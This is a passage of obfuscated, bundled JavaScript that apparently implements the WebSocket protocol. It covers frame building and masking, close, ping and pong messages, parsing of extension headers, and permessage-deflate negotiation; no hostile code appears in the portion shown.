{Duplex:_0x596cdd}=_0x16bbf8(0xcb),{randomFillSync:_0x1f9f28}=_0x16bbf8(0x3d6),_0x26e4f6=_0x16bbf8(0x3cb),{EMPTY_BUFFER:_0xad07f1,kWebSocket:_0x4a085c,NOOP:_0x41e893}=_0x16bbf8(0x266),{isBlob:_0x2930f5,isValidStatusCode:_0x276577}=_0x16bbf8(0x370),{mask:_0x46b61a,toBuffer:_0x36774c}=_0x16bbf8(0x152),_0x249977=Symbol(_0x17ecd7(0x217)),_0x5d82fa=Buffer['alloc'](0x4),_0x3983a1=0x2000;let _0xb93c48,_0x1433f6=_0x3983a1;class _0x303be1{constructor(_0x5d8b74,_0x436e96,_0x336a5f){const _0x28eb00=_0x17ecd7;this[_0x28eb00(0x10e)]=_0x436e96||{},_0x336a5f&&(this['_generateMask']=_0x336a5f,this[_0x28eb00(0x1d4)]=Buffer[_0x28eb00(0x167)](0x4)),this[_0x28eb00(0xe9)]=_0x5d8b74,this['_firstFragment']=!0x0,this['_compress']=!0x1,this[_0x28eb00(0x22c)]=0x0,this[_0x28eb00(0x235)]=[],this[_0x28eb00(0x1c4)]=0x0,this[_0x28eb00(0x1c3)]=_0x41e893,this[_0x4a085c]=void 0x0;}static['frame'](_0x3b6afe,_0x505de6){const _0x33f027=_0x17ecd7;let _0xcc62dc,_0x2c050e,_0x28727f=!0x1,_0xf3e8f=0x2,_0x6f98da=!0x1;_0x505de6[_0x33f027(0x1a0)]&&(_0xcc62dc=_0x505de6[_0x33f027(0x1bd)]||_0x5d82fa,_0x505de6[_0x33f027(0x1aa)]?_0x505de6[_0x33f027(0x1aa)](_0xcc62dc):(_0x1433f6===_0x3983a1&&(void 0x0===_0xb93c48&&(_0xb93c48=Buffer['alloc'](_0x3983a1)),_0x1f9f28(_0xb93c48,0x0,_0x3983a1),_0x1433f6=0x0),_0xcc62dc[0x0]=_0xb93c48[_0x1433f6++],_0xcc62dc[0x1]=_0xb93c48[_0x1433f6++],_0xcc62dc[0x2]=_0xb93c48[_0x1433f6++],_0xcc62dc[0x3]=_0xb93c48[_0x1433f6++]),_0x6f98da=0x0===(_0xcc62dc[0x0]|_0xcc62dc[0x1]|_0xcc62dc[0x2]|_0xcc62dc[0x3]),_0xf3e8f=0x6),_0x33f027(0x264)==typeof _0x3b6afe?_0x2c050e=_0x505de6['mask']&&!_0x6f98da||void 0x0===_0x505de6[_0x249977]?(_0x3b6afe=Buffer[_0x33f027(0x1f7)](_0x3b6afe))[_0x33f027(0x1d7)]:_0x505de6[_0x249977]:(_0x2c050e=_0x3b6afe[_0x33f027(0x1d7)],_0x28727f=_0x505de6['mask']&&_0x505de6[_0x33f027(0xbf)]&&!_0x6f98da);let _0x249781=_0x2c050e;_0x2c050e>=0x10000?(_0xf3e8f+=0x8,_0x249781=0x7f):_0x2c050e>0x7d&&(_0xf3e8f+=0x2,_0x249781=0x7e);const _0x597788=Buffer[_0x33f027(0x1f1)](_0x28727f?_0x2c050e+_0xf3e8f:_0xf3e8f);return _0x597788[0x0]=_0x505de6[_0x33f027(0x116)]?0x80|_0x505de6[_0x33f027(0x142)]:_0x505de6[_0x33f027(0x142)],_0x505de6[_0x33f027(0x12e)]&&(_0x597788[0x0]|=0x40),_0x597788[0x1]=_0x249781,0x7e===_0x249781?_0x597788[_0x33f027(0x1e0)](_0x2c050e,0x2):0x7f===_0x249781&&(_0x597788[0x2]=_0x597788[0x3]=0x0,_0x597788[_0x33f027(0x18d)](_0x2c050e,0x4,0x6)),_0x505de6[_0x33f027(0x1a0)]?(_0x597788[0x1]|=0x80,_0x597788[_0xf3e8f-0x4]=_0xcc62dc[0x0],_0x597788[_0xf3e8f-0x3]=_0xcc62dc[0x1],_0x597788[_0xf3e8f-0x2]=_0xcc62dc[0x2],_0x597788[_0xf3e8f-0x1]=_0xcc62dc[0x3],_0x6f98da?[_0x597788,_0x3b6afe]:_0x28727f?(_0x46b61a(_0x3b6afe,_0xcc62dc,_0x597788,_0xf3e8f,_0x2c050e),[_0x597788]):(_0x46b61a(_0x3b6afe,_0xcc62dc,_0x3b6afe,0x0,_0x2c050e),[_0x597788,_0x3b6afe])):[_0x597788,_0x3b6afe];}[_0x17ecd7(0x1d3)](_0x5a269c,_0x2432a0,_0x593dfe,_0x21c566){const _0x5777cd=_0x17ecd7;let _0x9ffb5d;if(void 0x0===_0x5a269c)_0x9ffb5d=_0xad07f1;else{if('number'!=typeof _0x5a269c||!_0x276577(_0x5a269c))throw new TypeError('First\x20argument\x20must\x20be\x20a\x20valid\x20error\x20code\x20number');if(void 0x0!==_0x2432a0&&_0x2432a0['length']){const _0x2ce8e4=Buffer[_0x5777cd(0x90)](_0x2432a0);if(_0x2ce8e4>0x7b)throw new RangeError(_0x5777cd(0x206));_0x9ffb5d=Buffer[_0x5777cd(0x1f1)](0x2+_0x2ce8e4),_0x9ffb5d['writeUInt16BE'](_0x5a269c,0x0),_0x5777cd(0x264)==typeof _0x2432a0?_0x9ffb5d['write'](_0x2432a0,0x2):_0x9ffb5d[_0x5777cd(0xd5)](_0x2432a0,0x2);}else _0x9ffb5d=Buffer[_0x5777cd(0x1f1)](0x2),_0x9ffb5d['writeUInt16BE'](_0x5a269c,0x0);}const _0x314174={[_0x249977]:_0x9ffb5d[_0x5777cd(0x1d7)],'fin':!0x0,'generateMask':this[_0x5777cd(0x13f)],'mask':_0x593dfe,'maskBuffer':this[_0x5777cd(0x1d4)],'opcode':0x8,'readOnly':!0x1,'rsv1':!0x1};0x0!==this[_0x5777cd(0x1c4)]?this[_0x5777cd(0x19f)]([this['dispatch'],_0x9ffb5d,!0x1,_0x314174,_0x21c566]):this[_0x5777cd(0x102)](_0x303be1['frame'](_0x9ffb5d,_0x314174),_0x21c566);}['ping'](_0x23f8ee,_0x5e7d74,_0x258725){const _0x420a56=_0x17ecd7;let _0x5624ad,_0x5c1f71;if(_0x420a56(0x264)==typeof _0x23f8ee?(_0x5624ad=Buffer[_0x420a56(0x90)](_0x23f8ee),_0x5c1f71=!0x1):_0x2930f5(_0x23f8ee)?(_0x5624ad=_0x23f8ee[_0x420a56(0x222)],_0x5c1f71=!0x1):(_0x5624ad=(_0x23f8ee=_0x36774c(_0x23f8ee))[_0x420a56(0x1d7)],_0x5c1f71=_0x36774c[_0x420a56(0xbf)]),_0x5624ad>0x7d)throw new RangeError(_0x420a56(0x203));const _0x4de92f={[_0x249977]:_0x5624ad,'fin':!0x0,'generateMask':this[_0x420a56(0x13f)],'mask':_0x5e7d74,'maskBuffer':this['_maskBuffer'],'opcode':0x9,'readOnly':_0x5c1f71,'rsv1':!0x1};_0x2930f5(_0x23f8ee)?0x0!==this[_0x420a56(0x1c4)]?this[_0x420a56(0x19f)]([this['getBlobData'],_0x23f8ee,!0x1,_0x4de92f,_0x258725]):this[_0x420a56(0x1ea)](_0x23f8ee,!0x1,_0x4de92f,_0x258725):0x0!==this[_0x420a56(0x1c4)]?this[_0x420a56(0x19f)]([this[_0x420a56(0x18c)],_0x23f8ee,!0x1,_0x4de92f,_0x258725]):this['sendFrame'](_0x303be1[_0x420a56(0x120)](_0x23f8ee,_0x4de92f),_0x258725);}[_0x17ecd7(0xc1)](_0x2c7011,_0x2658d2,_0x59e094){const _0x1e6103=_0x17ecd7;let _0x59a19b,_0x5e0f91;if('string'==typeof _0x2c7011?(_0x59a19b=Buffer[_0x1e6103(0x90)](_0x2c7011),_0x5e0f91=!0x1):_0x2930f5(_0x2c7011)?(_0x59a19b=_0x2c7011[_0x1e6103(0x222)],_0x5e0f91=!0x1):(_0x59a19b=(_0x2c7011=_0x36774c(_0x2c7011))['length'],_0x5e0f91=_0x36774c[_0x1e6103(0xbf)]),_0x59a19b>0x7d)throw new RangeError(_0x1e6103(0x203));const _0x5d976b={[_0x249977]:_0x59a19b,'fin':!0x0,'generateMask':this[_0x1e6103(0x13f)],'mask':_0x2658d2,'maskBuffer':this[_0x1e6103(0x1d4)],'opcode':0xa,'readOnly':_0x5e0f91,'rsv1':!0x1};_0x2930f5(_0x2c7011)?0x0!==this[_0x1e6103(0x1c4)]?this[_0x1e6103(0x19f)]([this[_0x1e6103(0x1ea)],_0x2c7011,!0x1,_0x5d976b,_0x59e094]):this[_0x1e6103(0x1ea)](_0x2c7011,!0x1,_0x5d976b,_0x59e094):0x0!==this['_state']?this[_0x1e6103(0x19f)]([this[_0x1e6103(0x18c)],_0x2c7011,!0x1,_0x5d976b,_0x59e094]):this[_0x1e6103(0x102)](_0x303be1['frame'](_0x2c7011,_0x5d976b),_0x59e094);}[_0x17ecd7(0x77)](_0x4f2cef,_0x7652b0,_0x3284d7){const _0xa1804c=_0x17ecd7,_0x270b8b=this[_0xa1804c(0x10e)][_0x26e4f6[_0xa1804c(0x1e6)]];let _0x3ec0d5,_0x44ac20,_0xc5da4a=_0x7652b0[_0xa1804c(0x187)]?0x2:0x1,_0x50a896=_0x7652b0[_0xa1804c(0x140)];_0xa1804c(0x264)==typeof _0x4f2cef?(_0x3ec0d5=Buffer[_0xa1804c(0x90)](_0x4f2cef),_0x44ac20=!0x1):_0x2930f5(_0x4f2cef)?(_0x3ec0d5=_0x4f2cef[_0xa1804c(0x222)],_0x44ac20=!0x1):(_0x3ec0d5=(_0x4f2cef=_0x36774c(_0x4f2cef))['length'],_0x44ac20=_0x36774c[_0xa1804c(0xbf)]),this['_firstFragment']?(this[_0xa1804c(0x18f)]=!0x1,_0x50a896&&_0x270b8b&&_0x270b8b[_0xa1804c(0x18a)][_0x270b8b['_isServer']?_0xa1804c(0x161):_0xa1804c(0xdf)]&&(_0x50a896=_0x3ec0d5>=_0x270b8b[_0xa1804c(0x1e3)]),this[_0xa1804c(0x1c7)]=_0x50a896):(_0x50a896=!0x1,_0xc5da4a=0x0),_0x7652b0[_0xa1804c(0x116)]&&(this[_0xa1804c(0x18f)]=!0x0);const _0x4c45dc={[_0x249977]:_0x3ec0d5,'fin':_0x7652b0[_0xa1804c(0x116)],'generateMask':this[_0xa1804c(0x13f)],'mask':_0x7652b0[_0xa1804c(0x1a0)],'maskBuffer':this['_maskBuffer'],'opcode':_0xc5da4a,'readOnly':_0x44ac20,'rsv1':_0x50a896};_0x2930f5(_0x4f2cef)?0x0!==this[_0xa1804c(0x1c4)]?this[_0xa1804c(0x19f)]([this['getBlobData'],_0x4f2cef,this['_compress'],_0x4c45dc,_0x3284d7]):this[_0xa1804c(0x1ea)](_0x4f2cef,this[_0xa1804c(0x1c7)],_0x4c45dc,_0x3284d7):0x0!==this[_0xa1804c(0x1c4)]?this[_0xa1804c(0x19f)]([this[_0xa1804c(0x18c)],_0x4f2cef,this['_compress'],_0x4c45dc,_0x3284d7]):this['dispatch'](_0x4f2cef,this[_0xa1804c(0x1c7)],_0x4c45dc,_0x3284d7);}['getBlobData'](_0x5f0a14,_0x21c721,_0x280f1d,_0x4fc9d1){const _0x156a94=_0x17ecd7;this[_0x156a94(0x22c)]+=_0x280f1d[_0x249977],this[_0x156a94(0x1c4)]=0x2,_0x5f0a14[_0x156a94(0x1b5)]()[_0x156a94(0x14f)](_0x3ab024=>{const _0x9b7f1f=_0x156a94;if(this['_socket'][_0x9b7f1f(0xa4)]){const _0x521991=new Error(_0x9b7f1f(0xb8));return void process[_0x9b7f1f(0x128)](_0x35c139,this,_0x521991,_0x4fc9d1);}this[_0x9b7f1f(0x22c)]-=_0x280f1d[_0x249977];const _0x398dff=_0x36774c(_0x3ab024);_0x21c721?this[_0x9b7f1f(0x18c)](_0x398dff,_0x21c721,_0x280f1d,_0x4fc9d1):(this[_0x9b7f1f(0x1c4)]=0x0,this[_0x9b7f1f(0x102)](_0x303be1['frame'](_0x398dff,_0x280f1d),_0x4fc9d1),this[_0x9b7f1f(0xf8)]());})[_0x156a94(0x259)](_0x5ea2e4=>{const _0x52509f=_0x156a94;process[_0x52509f(0x128)](_0x598d0d,this,_0x5ea2e4,_0x4fc9d1);});}[_0x17ecd7(0x18c)](_0x17f931,_0xa9bee5,_0x22fe73,_0x5f2e02){const _0xba29fc=_0x17ecd7;if(!_0xa9bee5)return void this[_0xba29fc(0x102)](_0x303be1[_0xba29fc(0x120)](_0x17f931,_0x22fe73),_0x5f2e02);const _0x119e59=this[_0xba29fc(0x10e)][_0x26e4f6[_0xba29fc(0x1e6)]];this[_0xba29fc(0x22c)]+=_0x22fe73[_0x249977],this[_0xba29fc(0x1c4)]=0x1,_0x119e59[_0xba29fc(0x140)](_0x17f931,_0x22fe73['fin'],(_0x13b3b6,_0x508430)=>{const _0x172f78=_0xba29fc;this[_0x172f78(0xe9)][_0x172f78(0xa4)]?_0x35c139(this,new Error('The\x20socket\x20was\x20closed\x20while\x20data\x20was\x20being\x20compressed'),_0x5f2e02):(this[_0x172f78(0x22c)]-=_0x22fe73[_0x249977],this['_state']=0x0,_0x22fe73[_0x172f78(0xbf)]=!0x1,this[_0x172f78(0x102)](_0x303be1[_0x172f78(0x120)](_0x508430,_0x22fe73),_0x5f2e02),this[_0x172f78(0xf8)]());});}[_0x17ecd7(0xf8)](){const _0x5b08f6=_0x17ecd7;for(;0x0===this[_0x5b08f6(0x1c4)]&&this[_0x5b08f6(0x235)][_0x5b08f6(0x1d7)];){const _0xa1717b=this['_queue'][_0x5b08f6(0x171)]();this[_0x5b08f6(0x22c)]-=_0xa1717b[0x3][_0x249977],Reflect[_0x5b08f6(0xa5)](_0xa1717b[0x0],this,_0xa1717b[_0x5b08f6(0x233)](0x1));}}['enqueue'](_0xb5596e){const _0x20d8e9=_0x17ecd7;this['_bufferedBytes']+=_0xb5596e[0x3][_0x249977],this[_0x20d8e9(0x235)][_0x20d8e9(0xa9)](_0xb5596e);}[_0x17ecd7(0x102)](_0x32398f,_0x1bef4e){const _0x1b04eb=_0x17ecd7;0x2===_0x32398f[_0x1b04eb(0x1d7)]?(this['_socket'][_0x1b04eb(0xfd)](),this[_0x1b04eb(0xe9)]['write'](_0x32398f[0x0]),this[_0x1b04eb(0xe9)][_0x1b04eb(0xe6)](_0x32398f[0x1],_0x1bef4e),this['_socket']['uncork']()):this['_socket']['write'](_0x32398f[0x0],_0x1bef4e);}}function _0x35c139(_0x136a52,_0x1112e8,_0x1c9b87){const _0x2a5b72=_0x17ecd7;_0x2a5b72(0xd4)==typeof _0x1c9b87&&_0x1c9b87(_0x1112e8);for(let _0x15ae6a=0x0;_0x15ae6a<_0x136a52[_0x2a5b72(0x235)]['length'];_0x15ae6a++){const _0xf2d506=_0x136a52[_0x2a5b72(0x235)][_0x15ae6a],_0x2fc053=_0xf2d506[_0xf2d506[_0x2a5b72(0x1d7)]-0x1];_0x2a5b72(0xd4)==typeof _0x2fc053&&_0x2fc053(_0x1112e8);}}function _0x598d0d(_0x16e64f,_0x2058f3,_0x2e1b98){const _0x2c0e88=_0x17ecd7;_0x35c139(_0x16e64f,_0x2058f3,_0x2e1b98),_0x16e64f[_0x2c0e88(0x1c3)](_0x2058f3);}_0x5e982f[_0x17ecd7(0x1f0)]=_0x303be1;},0x39e(_0x6c10ea,_0x201785,_0x5dc605){'use strict';const _0x237836=a0_0x208b;const {tokenChars:_0x31333c}=_0x5dc605(0x370);function _0x13b689(_0x5c423c,_0x45df48,_0x460e9d){void 0x0===_0x5c423c[_0x45df48]?_0x5c423c[_0x45df48]=[_0x460e9d]:_0x5c423c[_0x45df48]['push'](_0x460e9d);}_0x6c10ea[_0x237836(0x1f0)]={'format':function(_0x2239ad){const _0x3eb323=_0x237836;return Object[_0x3eb323(0xc9)](_0x2239ad)[_0x3eb323(0x95)](_0x3bae91=>{const _0x20b500=_0x3eb323;let _0x502087=_0x2239ad[_0x3bae91];return Array[_0x20b500(0x172)](_0x502087)||(_0x502087=[_0x502087]),_0x502087[_0x20b500(0x95)](_0x2b0880=>[_0x3bae91][_0x20b500(0x25f)](Object['keys'](_0x2b0880)['map'](_0x30ae52=>{const _0x25cb52=_0x20b500;let _0x5a1c12=_0x2b0880[_0x30ae52];return Array[_0x25cb52(0x172)](_0x5a1c12)||(_0x5a1c12=[_0x5a1c12]),_0x5a1c12[_0x25cb52(0x95)](_0x2dbc69=>!0x0===_0x2dbc69?_0x30ae52:_0x30ae52+'='+_0x2dbc69)['join'](';\x20');}))[_0x20b500(0x219)](';\x20'))[_0x20b500(0x219)](',\x20');})['join'](',\x20');},'parse':function(_0x454025){const _0x1127c0=_0x237836,_0x1b5c82=Object[_0x1127c0(0x168)](null);let _0x57e56e,_0x5d1c82,_0x48f784=Object['create'](null),_0x5164ed=!0x1,_0x1406c5=!0x1,_0x10d7d9=!0x1,_0xf0409d=-0x1,_0x132275=-0x1,_0x1137ef=-0x1,_0xa82213=0x0;for(;_0xa82213<_0x454025[_0x1127c0(0x1d7)];_0xa82213++)if(_0x132275=_0x454025[_0x1127c0(0x15c)](_0xa82213),void 0x0===_0x57e56e){if(-0x1===_0x1137ef&&0x1===_0x31333c[_0x132275])-0x1===_0xf0409d&&(_0xf0409d=_0xa82213);else{if(0x0===_0xa82213||0x20!==_0x132275&&0x9!==_0x132275){if(0x3b!==_0x132275&&0x2c!==_0x132275)throw new SyntaxError('Unexpected\x20character\x20at\x20index\x20'+_0xa82213);{if(-0x1===_0xf0409d)throw new SyntaxError(_0x1127c0(0x8d)+_0xa82213);-0x1===_0x1137ef&&(_0x1137ef=_0xa82213);const _0x156612=_0x454025[_0x1127c0(0x233)](_0xf0409d,_0x1137ef);0x2c===_0x132275?(_0x13b689(_0x1b5c82,_0x156612,_0x48f784),_0x48f784=Object[_0x1127c0(0x168)](null)):_0x57e56e=_0x156612,_0xf0409d=_0x1137ef=-0x1;}}else-0x1===_0x1137ef&&-0x1!==_0xf0409d&&(_0x1137ef=_0xa82213);}}else{if(void 0x0===_0x5d1c82){if(-0x1===_0x1137ef&&0x1===_0x31333c[_0x132275])-0x1===_0xf0409d&&(_0xf0409d=_0xa82213);else{if(0x20===_0x132275||0x9===_0x132275)-0x1===_0x1137ef&&-0x1!==_0xf0409d&&(_0x1137ef=_0xa82213);else{if(0x3b===_0x132275||0x2c===_0x132275){if(-0x1===_0xf0409d)throw new SyntaxError('Unexpected\x20character\x20at\x20index\x20'+_0xa82213);-0x1===_0x1137ef&&(_0x1137ef=_0xa82213),_0x13b689(_0x48f784,_0x454025['slice'](_0xf0409d,_0x1137ef),!0x0),0x2c===_0x132275&&(_0x13b689(_0x1b5c82,_0x57e56e,_0x48f784),_0x48f784=Object[_0x1127c0(0x168)](null),_0x57e56e=void 0x0),_0xf0409d=_0x1137ef=-0x1;}else{if(0x3d!==_0x132275||-0x1===_0xf0409d||-0x1!==_0x1137ef)throw new SyntaxError(_0x1127c0(0x8d)+_0xa82213);_0x5d1c82=_0x454025[_0x1127c0(0x233)](_0xf0409d,_0xa82213),_0xf0409d=_0x1137ef=-0x1;}}}}else{if(_0x1406c5){if(0x1!==_0x31333c[_0x132275])throw new SyntaxError(_0x1127c0(0x8d)+_0xa82213);-0x1===_0xf0409d?_0xf0409d=_0xa82213:_0x5164ed||(_0x5164ed=!0x0),_0x1406c5=!0x1;}else{if(_0x10d7d9){if(0x1===_0x31333c[_0x132275])-0x1===_0xf0409d&&(_0xf0409d=_0xa82213);else{if(0x22===_0x132275&&-0x1!==_0xf0409d)_0x10d7d9=!0x1,_0x1137ef=_0xa82213;else{if(0x5c!==_0x132275)throw new SyntaxError(_0x1127c0(0x8d)+_0xa82213);_0x1406c5=!0x0;}}}else{if(0x22===_0x132275&&0x3d===_0x454025[_0x1127c0(0x15c)](_0xa82213-0x1))_0x10d7d9=!0x0;else{if(-0x1===_0x1137ef&&0x1===_0x31333c[_0x132275])-0x1===_0xf0409d&&(_0xf0409d=_0xa82213);else{if(-0x1===_0xf0409d||0x20!==_0x132275&&0x9!==_0x132275){if(0x3b!==_0x132275&&0x2c!==_0x132275)throw new SyntaxError('Unexpected\x20character\x20at\x20index\x20'+_0xa82213);{if(-0x1===_0xf0409d)throw new SyntaxError(_0x1127c0(0x8d)+_0xa82213);-0x1===_0x1137ef&&(_0x1137ef=_0xa82213);let _0x3bd336=_0x454025[_0x1127c0(0x233)](_0xf0409d,_0x1137ef);_0x5164ed&&(_0x3bd336=_0x3bd336[_0x1127c0(0x9c)](/\\/g,''),_0x5164ed=!0x1),_0x13b689(_0x48f784,_0x5d1c82,_0x3bd336),0x2c===_0x132275&&(_0x13b689(_0x1b5c82,_0x57e56e,_0x48f784),_0x48f784=Object[_0x1127c0(0x168)](null),_0x57e56e=void 0x0),_0x5d1c82=void 0x0,_0xf0409d=_0x1137ef=-0x1;}}else-0x1===_0x1137ef&&(_0x1137ef=_0xa82213);}}}}}}if(-0x1===_0xf0409d||_0x10d7d9||0x20===_0x132275||0x9===_0x132275)throw new SyntaxError(_0x1127c0(0x89));-0x1===_0x1137ef&&(_0x1137ef=_0xa82213);const _0x117ee0=_0x454025[_0x1127c0(0x233)](_0xf0409d,_0x1137ef);return void 0x0===_0x57e56e?_0x13b689(_0x1b5c82,_0x117ee0,_0x48f784):(void 0x0===_0x5d1c82?_0x13b689(_0x48f784,_0x117ee0,!0x0):_0x13b689(_0x48f784,_0x5d1c82,_0x5164ed?_0x117ee0['replace'](/\\/g,''):_0x117ee0),_0x13b689(_0x1b5c82,_0x57e56e,_0x48f784)),_0x1b5c82;}};},0x3a0(_0x16b3d5){'use strict';const _0x3dcfc5=a0_0x208b;_0x16b3d5[_0x3dcfc5(0x1f0)]=require(_0x3dcfc5(0xdd));},0x3cb(_0x37b83f,_0x408a30,_0x538ac7){'use strict';const _0x3d400b=a0_0x208b;const _0x38828c=_0x538ac7(0x6a),_0x46f2d0=_0x538ac7(0x152),_0x2e3cbb=_0x538ac7(0x2f7),{kStatusCode:_0x9d0945}=_0x538ac7(0x266),_0x48b395=Buffer[Symbol[_0x3d400b(0xe4)]],_0x589517=Buffer['from']([0x0,0x0,0xff,0xff]),_0x14dadf=Symbol(_0x3d400b(0x11c)),_0xd5d6fa=Symbol(_0x3d400b(0x113)),_0x4b5801=Symbol(_0x3d400b(0x13e)),_0x14e1ba=Symbol(_0x3d400b(0xc5)),_0x5d3e05=Symbol(_0x3d400b(0x1b9));let _0x2e1f71;function _0x54e8dc(_0x488170){const _0x2d21e1=_0x3d400b;this[_0x14e1ba][_0x2d21e1(0xa9)](_0x488170),this[_0xd5d6fa]+=_0x488170[_0x2d21e1(0x1d7)];}function _0xdcf2f1(_0x12514c){const _0x249418=_0x3d400b;this[_0xd5d6fa]+=_0x12514c[_0x249418(0x1d7)],this[_0x14dadf][_0x249418(0x1be)]<0x1||this[_0xd5d6fa]<=this[_0x14dadf][_0x249418(0x1be)]?this[_0x14e1ba][_0x249418(0xa9)](_0x12514c):(this[_0x5d3e05]=new RangeError(_0x249418(0x1a7)),this[_0x5d3e05][_0x249418(0x17c)]=_0x249418(0x1ee),this[_0x5d3e05][_0x9d0945]=0x3f1,this[_0x249418(0xf2)](_0x249418(0x19a),_0xdcf2f1),this[_0x249418(0x15f)]());}function _0x45ffc2(_0x242403){const _0x4d873d=_0x3d400b;this[_0x14dadf][_0x4d873d(0xa0)]=null,this[_0x5d3e05]?this[_0x4b5801](this[_0x5d3e05]):(_0x242403[_0x9d0945]=0x3ef,this[_0x4b5801](_0x242403));}_0x37b83f['exports']=class{constructor(_0x1008fe,_0x4c9a81,_0x33dee2){const _0x231321=_0x3d400b;if(this[_0x231321(0x1be)]=0x0|_0x33dee2,this[_0x231321(0x255)]=_0x1008fe||{},this['_threshold']=void 0x0!==this[_0x231321(0x255)][_0x231321(0xce)]?this[_0x231321(0x255)][_0x231321(0xce)]:0x400,this[_0x231321(0x16d)]=!!_0x4c9a81,this[_0x231321(0xaf)]=null,this['_inflate']=null,this[_0x231321(0x18a)]=null,!_0x2e1f71){const _0x52762d=void 0x0!==this[_0x231321(0x255)][_0x231321(0x16b)]?this[_0x231321(0x255)][_0x231321(0x16b)]:0xa;_0x2e1f71=new _0x2e3cbb(_0x52762d);}}static get[_0x3d400b(0x1e6)](){return'permessage-deflate';}[_0x3d400b(0x25c)](){const _0x410eed=_0x3d400b,_0x2455cc={};return this[_0x410eed(0x255)][_0x410eed(0x14e)]&&(_0x2455cc[_0x410eed(0x161)]=!0x0),this[_0x410eed(0x255)]['clientNoContextTakeover']&&(_0x2455cc[_0x410eed(0xdf)]=!0x0),this[_0x410eed(0x255)]['serverMaxWindowBits']&&(_0x2455cc[_0x410eed(0xc4)]=this[_0x410eed(0x255)][_0x410eed(0x246)]),this[_0x410eed(0x255)]['clientMaxWindowBits']?_0x2455cc[_0x410eed(0xbd)]=this[_0x410eed(0x255)]['clientMaxWindowBits']:null==this['_options'][_0x410eed(0x154)]&&(_0x2455cc['client_max_window_bits']=!0x0),_0x2455cc;}[_0x3d400b(0x127)](_0x47b98d){const _0x2a2d7b=_0x3d400b;return _0x47b98d=this['normalizeParams'](_0x47b98d),this[_0x2a2d7b(0x18a)]=this[_0x2a2d7b(0x16d)]?this['acceptAsServer'](_0x47b98d):this[_0x2a2d7b(0x12f)](_0x47b98d),this['params'];}[_0x3d400b(0x109)](){const _0x3d5c81=_0x3d400b;if(this['_inflate']&&(this[_0x3d5c81(0xa0)][_0x3d5c81(0x1d3)](),this[_0x3d5c81(0xa0)]=null),this['_deflate']){const _0x53059b=this['_deflate'][_0x4b5801];this[_0x3d5c81(0xaf)][_0x3d5c81(0x1d3)](),this[_0x3d5c81(0xaf)]=null,_0x53059b&&_0x53059b(new Error('The\x20deflate\x20stream\x20was\x20closed\x20while\x20data\x20was\x20being\x20processed'));}}['acceptAsServer'](_0x36d44b){const _0x993dc1=_0x3d400b,_0x6797f9=this[_0x993dc1(0x255)],_0x4277da=_0x36d44b['find'](_0xadac9f=>!(!0x1===_0x6797f9['serverNoContextTakeover']&&_0xadac9f[_0x993dc1(0x161)]||_0xadac9f[_0x993dc1(0xc4)]&&(!0x1===_0x6797f9['serverMaxWindowBits']||_0x993dc1(0x115)==typeof _0x6797f9['serverMaxWindowBits']&&_0x6797f9[_0x993dc1(0x246)]>_0xadac9f[_0x993dc1(0xc4)])||_0x993dc1(0x115)==typeof _0x6797f9['clientMaxWindowBits']&&!_0xadac9f[_0x993dc1(0xbd)]));if(!_0x4277da)throw new Error(_0x993dc1(0x1c2));return _0x6797f9[_0x993dc1(0x14e)]&&(_0x4277da[_0x993dc1(0x161)]=!0x0),_0x6797f9[_0x993dc1(0x108)]&&(_0x4277da[_0x993dc1(0xdf)]=!0x0),_0x993dc1(0x115)==typeof _0x6797f9[_0x993dc1(0x246)]&&(_0x4277da[_0x993dc1(0xc4)]=_0x6797f9['serverMaxWindowBits']),'number'==typeof _0x6797f9[_0x993dc1(0x154)]?_0x4277da[_0x993dc1(0xbd)]=_0x6797f9[_0x993dc1(0x154)]:!0x0!==_0x4277da['client_max_window_bits']&&!0x1!==_0x6797f9['clientMaxWindowBits']||delete _0x4277da['client_max_window_bits'],_0x4277da;}[_0x3d400b(0x12f)](_0x2e32b9){const _0x36ea00=_0x3d400b,_0x55e012=_0x2e32b9[0x0];if(!0x1===this[_0x36ea00(0x255)][_0x36ea00(0x108)]&&_0x55e012[_0x36ea00(0xdf)])throw new Error(_0x36ea00(0x1de));if(_0x55e012['client_max_window_bits']){if(!0x1===this[_0x36ea00(0x255)][_0x36ea00(0x154)]||_0x36ea00(0x115)==typeof this['_options'][_0x36ea00(0x154)]&&_0x55e012[_0x36ea00(0xbd)]>this[_0x36ea00(0x255)]['clientMaxWindowBits'])throw new Error(_0x36ea00(0x16f));}else'number'==typeof this['_options'][_0x36ea00(0x154)]&&(_0x55e012['client_max_window_bits']=this[_0x36ea00(0x255)][_0x36ea00(0x154)]);return _0x55e012;}['normalizeParams'](_0x403fd8){const _0x1fc7d2=_0x3d400b;return _0x403fd8[_0x1fc7d2(0x1a8)](_0x39c8b7=>{const _0x38b275=_0x1fc7d2;Object[_0x38b275(0xc9)](_0x39c8b7)[_0x38b275(0x1a8)](_0x2f8171=>{const _0xc59ac=_0x38b275;let _0x2c955c=_0x39c8b7[_0x2f8171];if(_0x2c955c['length']>0x1)throw new Error(_0xc59ac(0xef)+_0x2f8171+_0xc59ac(0xb0));if(_0x2c955c=_0x2c955c[0x0],_0xc59ac(0xbd)===_0x2f8171){if(!0x0!==_0x2c955c){const _0x9d2501=+_0x2c955c;if(!Number['isInteger'](_0x9d2501)||_0x9d2501<0x8||_0x9d2501>0xf)throw new TypeError(_0xc59ac(0x76)+_0x2f8171+_0xc59ac(0x1c0)+_0x2c955c);_0x2c955c=_0x9d2501;}else{if(!this['_isServer'])throw new TypeError('Invalid\x20value\x20for\x20parameter\x20\x22'+_0x2f8171+_0xc59ac(0x1c0)+_0x2c955c);}}else{if('server_max_window_bits'===_0x2f8171){const _0x17254c=+_0x2c955c;if(!Number['isInteger'](_0x17254c)||_0x17254c<0x8||_0x17254c>0xf)throw new TypeError(_0xc59ac(0x76)+_0x2f8171+_0xc59ac(0x1c0)+_0x2c955c);_0x2c955c=_0x17254c;}else{if(_0xc59ac(0xdf)!==_0x2f8171&&_0xc59ac(0x161)!==_0x2f8171)throw new Error(_0xc59ac(0x101)+_0x2f8171+'\x22');if(!0x0!==_0x2c955c)throw new TypeError(_0xc59ac(0x76)+_0x2f8171+'\x22:\x20'+_0x2c955c);}}_0x39c8b7[_0x2f8171]=_0x2c955c;});}),_0x403fd8;}['decompress'](_0x587279,_0x53c14d,_0x2d1a02){_0x2e1f71['add'](_0x4f4240=>{const _0x142679=a0_0x208b;this[_0x142679(0x17f)](_0x587279,_0x53c14d,(_0x1ca3ab,_0x48837f)=>{_0x4f4240(),_0x2d1a02(_0x1ca3ab,_0x48837f);});});}[_0x3d400b(0x140)](_0x2ee692,_0x4fe2c2,_0x1ab2b2){const 